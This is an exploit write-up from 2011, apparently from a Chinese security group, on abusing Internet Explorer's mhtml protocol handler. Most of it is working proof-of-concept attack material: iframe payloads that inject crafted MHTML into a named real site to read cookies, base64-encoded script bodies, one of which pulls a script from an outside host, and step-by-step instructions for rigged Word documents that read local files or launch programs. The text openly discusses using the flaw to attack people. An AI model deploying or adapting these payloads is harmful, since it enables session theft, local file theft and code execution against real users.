@@ -1,0 +1,136 @@
+Hacking with mhtml protocol handler
+
+Author: www.80vul.com [Email:5up3rh3i#gmail.com]
+Release Date: 2011/1/15
+References: http://www.80vul.com/mhtml/Hacking%20with%20mhtml%20protocol%20handler.txt
+
+Ph4nt0m Webzine 0x05 (http://secinn.appspot.com/pstzine) Was finally released yesterday, There are two articles about the browser security[0x05 and 0x06].If the combination of both, we can complete a lot of interesting attacks...
+
+1.Cross Site Scripting by upload mhtml file
+
+Using the mhtml protocol handler,The file extension is ignored.so the attacker use renname the  mhtml file to a *.jpg file,etc. then upload it to the target site...
+
+ofcouser ,we can use "copy /b 1.jpg + 1.mhtml 2.jpg" to bypass some upload file format security restrictions
+
+then use iframe tag src to it:
+
+<iframe src="MHTML:http://target-site.com/upfile/demo.html!cookie"></iframe>
+
+2.Cross Site Scripting mhtml-file string injection
+
+the mhtml-file format is only base on CRLF,so if we can injection CRLF, the site may be attacked.
+
+poc:
+
+test it on win7 system pls.
+
+<iframe src="mhtml:http://www.tudou.com/my/channel/item.srv?icode=enQCgQKJTDs&callback=Content-Type%3A%20multipart%2Frelated%3B%20boundary%3D_boundary_by_mere%0D%0A%0D%0A--_boundary_by_mere%0D%0AContent-Location%3Acookie%0D%0AContent-Transfer-Encoding%3Abase64%0D%0A%0D%0APGJvZHk%2BDQo8aWZyYW1lIGlkPWlmciBzcmM9Imh0dHA6Ly93d3cuODB2dWwuY29tLyI%2BPC9pZnJhbWU%2BDQo8c2NyaXB0Pg0KYWxlcnQoZG9jdW1lbnQuY29va2llKTsNCmZ1bmN0aW9uIGNyb3NzY29va2llKCl7DQppZnIgPSBpZnIuY29udGVudFdpbmRvdyA%2FIGlmci5jb250ZW50V2luZG93IDogaWZyLmNvbnRlbnREb2N1bWVudDsNCmFsZXJ0KGlmci5kb2N1bWVudC5jb29raWUpDQp9DQpzZXRUaW1lb3V0KCJjcm9zc2Nvb2tpZSgpIiwxMDAwKTsNCjwvc2NyaXB0PjwvYm9keT4NCg%3D%3D%0D%0A--_boundary_by_mere--%0D%0A!cookie"></iframe> 
+
+if win-xp or win2k3 system,pls do it by the second urlencode.
+
+mhtml-file string injection in JOSN file, some sites restrict the JOSN file's Content-Type to defense xss. maybe we can use mhtml-file string injection to pass it :)
+
+3.bypass X-Frame-Options
+
+X-Frame-Options did not protect the mhtml protocol handler.
+
+the demo:
+
+<iframe src="mhtml:http://www.80vul.com/mhtml/zz.php!cookie"></iframe>
+<iframe src="http://www.80vul.com/mhtml/zz.php"></iframe>
+
+4.mhtml+file://uncpath+Adobe Reader 9 == local xss vul
+
+Billy (BK) Rios introduced a very interesting approach to Steal local files on the RuxCon/Baythreat(https://xs-sniper.com/blog/2010/12/17/will-it-blend/) ,it used  "Script src to local files in the LocalLow directory" by file:// +java apple +Adobe Reader+Adobe flash to complete it. but if used mhtml+file://uncpath, so easy to do it.
+
+Demo:
+
+test it on win2k3+ie8+Adobe Reader 9
+
+http://www.80vul.com/hackgame/xs-g0.php?username=Administrator
+
+
+5.mhtml+file://uncpath+word == local xss vul
+
+demo:http://www.80vul.com/mhtml/word.doc
+
+download it, and save it on c:\word.doc and open it. u can get the alert c:\boot.ini 's content.
+
+this is base on "Microsoft word javascript execution"(http://marc.info/?l=bugtraq&m=121121432823704&w=2).
+
+to make the proof of concept follow the following steps:
+
+1-Make a html file and paste xss code
+2-Open the html file with the word and save as c:\word.xml
+3-Open the word.xml with the notepad,and inject the mhtml code in <w:t>aaaaa </w:t>
+4-Rename c:\word.xml to c:\word.doc
+5-Open c:\word.doc file
+
+xss code
+---------------------------------------------------------
+<html><OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=http://www.80vul.com/hackgame/word.htm></OBJECT>
+aaaaa
+----------------------------------------------------------
+
+mhtml code
+--------------------------------------------------------
+/*
+Content-Type: multipart/related; boundary="_boundary_by_mere":
+
+--_boundary_by_mere
+Content-Location:cookie
+Content-Transfer-Encoding:base64
+
+PGJvZHk+DQo8c2NyaXB0IHNyYz0naHR0cDovL3d3dy44MHZ1bC5jb20vaGFja2dhbWUvZ28uanMnPjwvc2NyaXB0Pg0KPC9ib2R5Pg0K
+--_boundary_by_mere--
+
+*/
+--------------------------------------------------------
+
+if u use this vul to attack someone,u need to known the word file path where save the download file. and lots of guns used on the desktop :)
+ 
+"Microsoft word javascript execution" is only work on office 2k3 and 2k7, In other versions u can make the link, and src to http://www.80vul.com/hackgame/word.htm
+
+update
+ofcouse ,this way maybe work on anoher file type like:*.pdf by app.launchURL()
+
+
+6. Coss Zone Scripting
+
+First we would like to mention a very old vulnerability:
+
+<OBJECT CLASSID=CLSID:12345678-1234-4321-1234-111111111111 CODEBASE=c:/winnt/system32/calc.exe></OBJECT>
+
+This vulnerability (by firebug9[http://hi.baidu.com/firebug9/blog/item/b7627c4624cd880f6a63e5e7.html]) allows you to execute any program on "My Computer" zone,Been tested and found to this vul work on ie6/ie7/ie8+win2k/winxp/win2k3
+
+Then repeat "5.mhtml+file://uncpath+word == local xss vul" steps and change:
+
+xss code
+---------------------------------------------------------
+<html><OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=mhtml:file://c:/word.doc!cookie></OBJECT>
+aaaaa
+----------------------------------------------------------
+
+mhtml code
+--------------------------------------------------------
+/*
+Content-Type: multipart/related; boundary="_boundary_by_mere":
+
+--_boundary_by_mere
+Content-Location:cookie
+Content-Transfer-Encoding:base64
+
+PE9CSkVDVCBDTEFTU0lEPUNMU0lEOjEyMzQ1Njc4LTEyMzQtNDMyMS0xMjM0LTExMTExMTExMTExMSBDT0RFQkFTRT1jOi93aW5kb3dzL3N5c3RlbTMyL2NhbGMuZXhlPjwvT0JKRUNUPg==
+--_boundary_by_mere--
+
+*/
+--------------------------------------------------------
+
+
+thx d4rkwind(http://hi.baidu.com/d4rkwind/) for his excellent paper.
+
+
+About Ph4nt0m Webzine
+
+Ph4nt0m Webzine is a free network Security Magazine,We accept articles in English and Chinese, you are welcome contributions . 
+mailto:root_at_ph4nt0m.org pls.thank you!
